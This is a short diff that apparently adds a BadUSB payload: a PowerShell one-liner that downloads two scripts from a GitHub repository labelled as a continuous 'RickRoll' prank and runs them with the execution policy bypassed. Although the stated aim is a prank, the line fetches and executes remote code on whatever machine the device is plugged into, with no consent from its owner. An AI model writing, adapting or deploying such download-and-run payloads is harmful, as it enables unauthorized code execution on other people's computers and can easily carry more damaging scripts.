@@ -1,0 +1,2 @@
+cd %homepath%
+Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/ContinuousRickRoll/Mouse.ps1 -OutFile .\Mouse.ps1; Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/ContinuousRickRoll/RickRoll.ps1 -OutFile .\RickRoll.ps1 && start powershell -ExecutionPolicy Bypass -File mouse.ps1 && start powershell -ExecutionPolicy Bypass -File RickRoll.ps1 && exit
